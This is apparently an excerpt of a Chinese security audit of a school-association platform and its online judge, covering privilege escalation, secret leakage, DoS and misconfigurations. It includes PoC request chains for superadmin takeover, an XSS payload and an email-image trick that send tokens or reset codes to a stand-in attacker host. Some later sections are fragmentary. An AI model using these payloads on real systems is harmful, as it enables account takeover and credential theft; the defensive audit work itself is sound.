## 二、Critical

### C1. role 2 管理员改超管 QQ → 找回密码 → 接管超管

**证据链**

1. `PUT /api/user/{id}` 允许 `0/1/2`：
   `sap-backend/src/main/java/com/sap/controller/UserController.java:58-62`
2. `UserService.updateUser` 对任意目标用户直接写 `qq`/`status`，没有“目标角色高于调用者”校验：
   `sap-backend/src/main/java/com/sap/service/UserService.java:51-62`
   ```java
   existing.setQq(user.getQq());
   existing.setStatus(user.getStatus());
   ```
3. 找回密码把验证码发到用户**当前** QQ：
   `sap-backend/src/main/java/com/sap/service/PasswordRecoveryService.java:72-99`
   ```java
   String qq = user == null ? null : user.getQq();
   ...
   hooks.passwordCode(user, code, ...)
   ```
4. `reset` 用当前 QQ 的哈希与当前密码哈希做一致性校验，改 QQ 后二者仍然自洽：
   `PasswordRecoveryService.java:101-127`
5. 目标用户可以是 role 0（超管），`updateUser` 没有像 `resetPassword`/`updateUserRole` 那样阻止 role 2 操作高权限账号。

**利用步骤（PoC 摘要）**

```text
1) 以 role 2 登录，GET /api/user/list 拿到超管 id / studentId
2) PUT /api/user/<超管id>   {"qq":"12345678","status":1}
3) GET /api/auth/captcha   取得 captchaId + 图片
4) POST /api/auth/password-recovery/send
   {"account":"<超管学号>","captchaId":"...","captcha":"..."}
   → 验证码邮件发到 12345678@qq.com（攻击者）
5) POST /api/auth/password-recovery/reset
   {"requestId":"...","code":"123456","newPassword":"..."}
6) 用新密码登录超管账号
```

**影响**：role 2（“管理员”，含团支书/副会长/部长等）可直接接管 role 0/1 账号，读取/修改全部数据、重置任意密码、发布恶意内容。这是当前最严重的问题。

**修复建议**

- `UserService.updateUser` 增加目标角色校验：role 2 不得修改 role ≤1 用户的 `qq`/`status`/`avatar`/`nickname`；role 2 也不得修改自己的 `status`。
- 更彻底：`qq`、`status`、`avatar` 等敏感字段拆成独立接口，分别授权；修改 QQ 必须走二次验证（原密码/短信/邮箱确认），不能由管理员直接改。
- 找回密码改为“发送到注册时绑定的不可变邮箱”，或增加“修改 QQ 时通知旧 QQ + 冷却期”。
- `UserService.resetPassword` 和 `updateUser` 成功后 `StpUtil.kickout(userId)`（见 H1）。
- 该问题在 `ops/security-audit/SecurityAuditProof.java:134` 已有 `role2_changes_superadmin_recovery_address` 证明，当前代码仍未修复。

### C2. 任意登录用户读取 COS 密钥 / SMTP 密文（`/api/setting/value`）

**证据链**

1. `SettingController.getValue` 只要求登录，没有角色限制：
   `sap-backend/src/main/java/com/sap/controller/SettingController.java:29-38`
   ```java
   @GetMapping("/value")
   public Result<?> getValue(@RequestParam String key) {
       String canonical = ...toLowerCase(...);
       if (canonical.equals("app_download_url")) throw ...;
       if (SENSITIVE_KEYS.contains(key)) throw ...;   // 只比较原始 key
       return Result.ok(settingService.getValue(key));
   }
   ```
2. `SENSITIVE_KEYS` 只有 `cos_secret_id`、`cos_secret_key`、`guest_access_level`、`allow_guest_login`：
   `SettingController.java:26-28`
   **没有 `email_smtp_password`**。
3. `SettingService.getValue` 只对 `registration_protection_*` 前缀做二次校验：
   `sap-backend/src/main/java/com/sap/service/SettingService.java:104-133`
   它明确注释“数据库排序规则可能忽略大小写或重音，必须再检查实际命中的键”，但只对注册防护前缀执行；敏感 key 没有对**实际命中行**再校验。
4. 生产文档推荐外部 MySQL；MySQL 默认 `utf8mb4_0900_ai_ci`（大小写不敏感）或旧库 `utf8mb4_general_ci`（大小写不敏感且 PAD SPACE）。`WHERE setting_key = 'COS_SECRET_KEY'` 会命中 `cos_secret_key` 行。
5. 注册是开放的：`Captcha` 默认 `enabled=true, freeLimit=0`，只要求解一次图形验证码（`sap-backend/src/main/java/com/sap/dto/RegistrationProtectionConfig.java:36-39`）。任何互联网用户都能注册 role 4。

**PoC**

```text
# 注册/登录普通游客，拿 sap-token
GET /api/setting/value?key=COS_SECRET_KEY      # 大小写变体，MySQL CI 命中 cos_secret_key
GET /api/setting/value?key=email_smtp_password # 该 key 根本不在 SENSITIVE_KEYS，精确 key 也返回密文
```

**影响**

- `COS_SECRET_KEY` + `cos_bucket_name` + `cos_region`（同样可读）→ 完全控制对象存储：列出/下载/覆盖/删除全部文件、盗刷流量/存储、上传恶意内容。
- `email_smtp_password` 返回 AES-GCM 密文；若 `JW_AES_KEY` 仍为默认值或被泄露，可解密 SMTP 授权码（并与 C3 叠加）。
- 该问题在 `SecurityAuditProof.java:83` 的 `settings_guest_reads_sensitive_key_variants` 已证明，当前仍未修复。

**修复建议**

- 把 `/api/setting/value` 限制为 `@SaCheckRole({"0","1"})`，或改成**白名单**：只允许 `footer_*`、`qr_*`、`current_grade`、`membership_fee` 等公开 key。
- 对 `canonical` 后的 key 和**数据库实际命中的 `settingKey`** 双重校验敏感集合；`SENSITIVE_KEYS` 加入 `email_smtp_password`、`email_smtp_username`、`cos_*`。
- 敏感配置一律走专用脱敏接口（`/api/setting/cos-config`、`/api/email/config`），通用接口永不返回。
- 若必须保留通用接口，使用“允许读取的 key 白名单”而不是“敏感 key 黑名单”。

### C3. role 2 管理员改 SMTP / 验证码模板 → 截获找回密码验证码 → 接管超管

**证据链**

1. `EmailController` 类级权限是 `0/1/2`：
   `sap-backend/src/main/java/com/sap/controller/EmailController.java:25-26`
   包含 `PUT /api/email/config`、`POST /api/email/test-send`、`PUT /api/email/templates/{id}`、`PUT /api/email/bindings/{eventKey}`。
2. `EmailService.saveConfig` 接受任意 `host`/`port`/`username`，没有允许列表：
   `sap-backend/src/main/java/com/sap/service/EmailService.java:84-110`
3. `buildSender` 直接使用数据库中的 `email_smtp_host`：
   `EmailService.java:239`
4. 密码找回验证码通过该 SMTP 发送：
   `PasswordRecoveryService.java:95` → `EmailBusinessHooks.passwordCode` → `MailQueue` → `EmailService.deliver`。
5. 模板校验只做“变量名集合”检查，`UNSAFE_HTML` 只拦 `<script`、`javascript:`、`on*=`：
   `EmailService.java:53-54, 312-323`
   `MailQueue.validateContract` 只要求模板包含 `code`、`expiresInMinutes` 等变量（`MailQueue.java:263-266`）。
   因此可以在验证码邮件里放 `<img src="https://attacker/?c={{code}}">`，变量名检查通过，邮件客户端加载图片时把验证码带到攻击者服务器。

**两条利用路径**

- **路径 A（最直接）**：role 2 把 SMTP 改成自己的服务器 → 对超管触发找回密码 → 攻击者 SMTP 收到完整邮件（收件人 + 正文验证码）→ `reset` 接管。
- **路径 B**：role 2 修改 `PASSWORD_CODE` 模板，把 `{{code}}` 放进外部图片 URL → 超管打开邮件时验证码外带。

**影响**：与 C1 相同的超管接管；另外 `test-send` 可向任意收件人发送任意 HTML，冒充协会官方邮箱做钓鱼。

**修复建议**

- `EmailController` 的配置/模板/绑定/测试发送全部限制到 `0/1`；最好要求超管重新输入密码或二次验证。
- SMTP host 允许列表（如仅 `smtp.qq.com`/企业邮局域名），禁止任意 host/port；`testConnection` 也限制。
- 验证码模板：禁止在 HTML 属性/URL 中使用 `{{code}}`，只允许纯文本节点；或由服务端强制固定模板，不允许管理员编辑验证码模板。
- 模板校验增加“禁止外部资源/图片/表单/iframe”的策略；`UNSAFE_HTML` 现在太弱。
- 找回密码发送时通知用户“你的找回密码验证码已发送”，并给旧 QQ/站内信发提醒。

### C4. 题目标题来源链接 `sourceUrl` 存储型 XSS（role 2 → role 0）

**证据链**

1. 后端只在“非原创”时校验 `sourceUrl` 必须为 HTTPS；`sourcePlatform=原创/ORIGINAL` 时**完全不校验**：
   `sap-backend/src/main/java/com/sap/service/judger/OjService.java:285-288`
   ```java
   if (!"ORIGINAL".equalsIgnoreCase(p.getSourcePlatform()) && !"原创".equals(p.getSourcePlatform())) {
       try { URI u = URI.create(p.getSourceUrl()); if (!"https".equals(u.getScheme()) ...) fail(...); }
   }
   ```
2. 题目创建/修改/发布允许 role 0/1/2：
   `sap-backend/src/main/java/com/sap/controller/judger/OjAdminController.java:15`
3. `publicDetail` 把 `sourceUrl` 原样返回：
   `OjService.java:250`
4. 用户端直接绑定到 `href`，没有协议校验：
   `sap-user/src/views/oj/OjWorkspace.vue:18`
   ```html
   <a v-if="problem.sourceUrl" :href="problem.sourceUrl" target="_blank" rel="noopener noreferrer">
   ```
5. nginx 把用户端 `/` 与管理端 `/admin/` 放在**同一 origin**（`docker/nginx.conf:57,70`），两套 token 分别在 `localStorage['sap_token']` 与 `localStorage['sap-token']`。

**利用**

role 2 创建题目，`sourcePlatform` 填“原创”，`sourceUrl` 填：

```text
javascript:fetch('https://attacker/?'+localStorage['sap-token']+localStorage['sap_token'])
```

发布后，任何用户（包括超管）打开该题并点击“来源”链接，脚本在 SPA origin 执行，可读取两套 token、以受害者身份调用任意接口（包括 `PUT /api/user/{id}`、`PUT /api/user/{id}/roles` 等）。`rel=noopener` 不会阻止 `javascript:` 在当前文档执行。

**修复**

- 后端：无论 `sourcePlatform` 是什么，`sourceUrl` 只允许空或 `https://`（用 `URI` 校验 scheme+host，拒绝 `javascript:`/`data:`/`vbscript:`/控制字符）。
- 前端：`computed safeSourceUrl`，用 `new URL(value, location.origin)`，仅允许 `http:`/`https:` 才绑定 `href`。
- 同时检查题单 `sourceUrl`、题目 `sourceNote` 等其他可注入字段；`sourceNote` 目前作为文本渲染，风险较低。
- 增加 CSP（见 M9）作为兜底。

## 三、High

### H1. 管理员重置密码不注销旧会话；App token 永久有效

- `UserService.resetPassword` 更新密码后没有 `StpUtil.kickout(userId)`：
  `sap-backend/src/main/java/com/sap/service/UserService.java:97-118`
- `AuthService.appLogin` 明确设置 `setTimeout(-1)`、`setActiveTimeout(-1)`：
  `sap-backend/src/main/java/com/sap/service/AuthService.java:68-78`
- 对比：`updateUser` 在 `status != 1` 时会 `kickout`（`UserService.java:61`），但改密码不会；`PasswordRecoveryService.reset` 会 `StpUtil.logout(userId)`（`PasswordRecoveryService.java:123,133`）。

**影响**：账号被盗后，管理员重置密码并不能把攻击者踢下线；攻击者持有的 App token 永久有效。`SecurityAuditProof.java:149` 已记录该问题。

**修复**：`resetPassword` 成功后 `StpUtil.kickout(userId)`（或 `logout(userId)`），并清理该用户所有 device token；App 端在密码变更后强制重新登录。考虑给 App token 设置可轮换的 refresh token，而不是永久 token。

### H2. bearer token 出现在 URL query，且后端全局接受 query token

- 用户端 PDF：`sap-user/src/views/NoteDetail.vue:135-137`
- 管理端 PDF：`sap-admin/src/views/NoteView.vue:309-311`
- 管理端财务导出：`sap-admin/src/views/FinanceView.vue:349-350`
  ```js
  const token = localStorage.getItem('sap-token') || ''
  window.open(`/api/note/${row.id}/pdf?sap-token=${encodeURIComponent(token)}`)
  ```
- `application.yml` 只配置了 `token-name: sap-token`；Sa-Token 1.38 的 `is-read-body` 默认为 `true`，`StpLogic.getTokenValueNotCut()` 会先读 `SaRequest.getParam(tokenName)`，即 query/body 参数，再读 header/cookie。
- nginx `log_format` 使用 `"$request"`，完整记录 query：
  `docker/nginx.conf:24`

**影响**：token 进入 nginx access log、浏览器历史、新标签页 URL、代理/CDN 日志；配合永久 App token（H1），拿到日志的人可长期接管账号。

**修复**

- 改成一次性下载票据（项目已有 `AppDownloadService` 的 60 秒、IP 绑定、单次票据模式），或 `fetch` 带 header 拿 blob 后 `URL.createObjectURL` 下载。
- `application.yml` 设置 `sa-token.is-read-body: false`、`is-read-cookie: false`，只允许 header；`token-name` 保持不变。
- nginx 对 `/api/` 使用 `$uri` 而非 `$request` 记录，或对 `sap-token`/`token` 参数脱敏。

### H3. 启用内置判题时，公网容器持有宿主级权限

- `docker/docker-compose.judger.yml:7-14` 给 `app` 容器加：
  `SYS_ADMIN`、`SYS_PTRACE`、`SYS_RESOURCE`、`systempaths=unconfined`、自定义 seccomp，以及：
  ```yaml
  - /sys/fs/cgroup/memory/sapjudger:/sys/fs/cgroup/memory:rw
  - /sys/fs/cgroup/pids/sapjudger:/sys/fs/cgroup/pids:rw
  - /sys/fs/cgroup/cpu,cpuacct/sapjudger:/sys/fs/cgroup/cpu,cpuacct:rw
  - /sys/fs/cgroup/cpuset/sapjudger:/sys/fs/cgroup/cpuset:rw
  ```
- 同一容器在 `docker/docker-compose.yml:17-19` 发布 80/443，并跑 nginx + Java + judge agent（root PID 1）。

**影响**：这是项目有意为之的内置判题模式，但一旦 go-judge/namespace/seccomp 被逃逸，攻击者从“判题容器”直接获得宿主 cgroup 写权限和 `SYS_ADMIN`，容器→宿主风险显著。此前的安全审查也把它列为“保留的结构性风险”。

**修复**：优先使用 `standalone-oj/compose.split.yml` 的分离部署（server + worker），或至少使用 cgroup v2 + `cgroup: private` + private cgroupns，不要把宿主 cgroup 子树直接 rw 挂进对公网容器；不要在同一容器上同时启用 `JUDGER_ENABLED=true` 和 80/443。

### H4. C4 + 同源/无 CSP 的组合风险

C4 的 XSS 可读取两套 token；`sap-admin` 与 `sap-user` 同源，且 nginx 没有 CSP。即使修复了 C4，任何未来的 XSS 都会直接升级为管理员接管。修复 C4 的同时，按 M9 加 CSP，并考虑把管理端迁到独立 origin（不同子域至少不同 origin），避免 user 端 XSS 直接读 admin token。

### H5. 未认证请求体在鉴权前解析，可打爆 JVM 堆

- 心跳接口用 `@RequestBody Map<String,Object>` 接收任意 JSON：
  `sap-backend/src/main/java/com/sap/controller/judger/OjNodeHeartbeatController.java:16`
- 该路径被排除 Sa-Token 登录校验：
  `sap-backend/src/main/java/com/sap/config/WebMvcConfig.java:64`
- token 校验发生在 body 已被 Jackson/Fastjson 解析之后：
  `sap-backend/src/main/java/com/sap/service/judger/JudgerNodes.java:81-85`
- nginx 对 `/api/` 允许 50MB（`docker/nginx.conf:97`），容器默认 `-Xmx512m`（`docker/docker-compose.yml:29`），心跳限流仅 60/min/IP（`RateLimitProperties.java:39`）。
- 同类：`/api/auth/login` 等白名单接口在鉴权前解析 body；`standalone-oj` 的 `max-http-form-post-size: 8MB` 只约束 form，不约束 JSON。

**影响**：未认证攻击者并发发送 2–3 个接近 50MB 的 JSON，即可让 512MB 堆 OOM/频繁 GC，导致服务不可用。这是低门槛 DoS。

**修复**：在 Filter 层先读取 `Content-Length`，心跳限制到 16KiB、登录限制到 8KiB，超限直接 413，不进入 `@RequestBody`；nginx 对心跳单独 `client_max_body_size 16k`；不要把 `max-http-form-post-size` 当作 JSON 限额。

### H6. 独立判题节点完全受信，可读隐藏测试/用户代码、伪造结果

- `JudgerNodeTransport` 对节点返回的任意 2xx JSON 直接解析：
  `sap-backend/src/main/java/com/sap/service/judger/JudgerNodeTransport.java:21-35`
- `JudgeEngine` 直接采用节点返回的 `status/files/time/memory`：
  `sap-backend/src/main/java/com/sap/service/judger/JudgeEngine.java:70-116`
- `GoJudgeClient` 会把用户代码和隐藏测试 stdin 发给节点：
  `sap-backend/src/main/java/com/sap/service/judger/GoJudgeClient.java:24-45`
- `OjNodeController` 允许 role 0/1/2 注册/控制节点：
  `sap-backend/src/main/java/com/sap/controller/judger/OjNodeController.java:12,18-22`
- 没有结果签名、任务 nonce、TLS/SPKI pin 或 attestation。

**影响**：被攻陷/恶意的独立节点可以记录隐藏测试与用户代码；可以伪造 RE/TLE/WA 以及时间/内存（排行榜可刷）；对期望输出为空/极弱的用例可直接伪造 AC。期望输出仍在服务端比较（`JudgeEngine.java:102-108`），因此不能对所有隐藏用例通用伪造 AC，但判题完整性已不可信。role 2 本身已可通过 `OjAdminController` 查看题包，因此主要风险是外部节点被攻陷。

**修复**：把节点当不可信执行器：结果 HMAC/签名 + 每任务 nonce；节点 TLS/SPKI pin；隐藏测试只在受信节点执行；节点管理限制到超管；对节点上报做异常检测。

### H7. 工作区明文生产密钥（未提交，但仍在磁盘/备份）

- `ops/REMOTE_DEBUG.local.md:29-55` 含 RSA 私钥；`:66-67` 含生产 DB root 密码与实际 `JW_AES_KEY`。
- `ops/server.local.env`、`ops/database.local.env`、`ops/infrastructure.local.md` 同类文件。
- 这些文件权限 600、被 `.gitignore`/`.dockerignore` 排除、未进 release 包、未被 git 跟踪（`git check-ignore` 确认）；**但明文仍在工作区、备份、同步盘、屏幕共享/远程调试记录中**。

**影响**：能读取工作区/备份的人可直接登录生产 MySQL/SSH，并用 `JW_AES_KEY` 解密全部已存教务密码。

**修复**：立即轮换 `JW_AES_KEY`（注意存量 `jw_password_enc` 需迁移重加密或强制重绑）、DB root 口令、SSH key；把密钥移入 KMS/密钥管理器；清理备份、历史副本、同步盘；删除 `ops/REMOTE_DEBUG.local.md` 中的私钥段。

- `SecurityAuditProof.java:228` 已记录。
- 修复：先 `trim()`，按数据库实际命中的 `user.getId()` 做锁定 key；限制学号字符集；对同一账号做跨 IP 的失败计数。

### M5. CORS `*` + `allowCredentials(true)`，Sa-Token cookie 未加固

- `WebMvcConfig`：`allowedOriginPatterns("*")` + `allowCredentials(true)`，且 `app.cors.allowed-origins` 没有在 `application-docker.yml` 设置：

### M9. nginx 缺 CSP，且安全头在静态资源上丢失

## 九、限制与说明

- 本报告是静态审查，未对生产环境发起请求，未实际验证 MySQL 排序规则、SMTP 配置、CDN 域名、判题 overlay 是否启用；相关结论已注明前提。
- C2 的“大小写变体绕过”在 MySQL CI 排序规则下成立（生产文档推荐 MySQL）；本地 H2 可能无法复现。
- C3 的路径 A 需要系统已配置可用的 SMTP（或 role 2 自己配置）；路径 B 需要受害者打开验证码邮件并加载外部图片。
- C1/C3/C4 均要求攻击者先拥有 role 2 账号；但 role 2 是“管理员/部长”级，且系统本来明确限制 role 2 重置 0/1 密码，因此这些是真实的权限边界突破，而不是“管理员本来就能做”。
- H5 的 OOM 取决于实际堆大小、并发连接与 nginx 限制；本报告按 `-Xmx512m`＋50M body＋60/min 的默认部署估算，未做运行时压测。
- H6 需要“恶意/被攻陷的独立节点”或 role 2 自己注册节点；它不是普通用户可触发的漏洞，但会破坏判题完整性和隐藏数据保密性。
- H7 是工作区/备份的密钥卫生问题，不是远程可利用漏洞；但一旦泄露，影响覆盖全部教务凭据与生产 DB/SSH。
- `ops/security-audit/SecurityAuditProof.java` 是“漏洞证明”而非修复证明；其 `CONFIRMED` 表示漏洞存在。建议把其中仍成立的项转成自动化回归测试（断言应被拒绝），而不是保留“证明可利用”的测试。
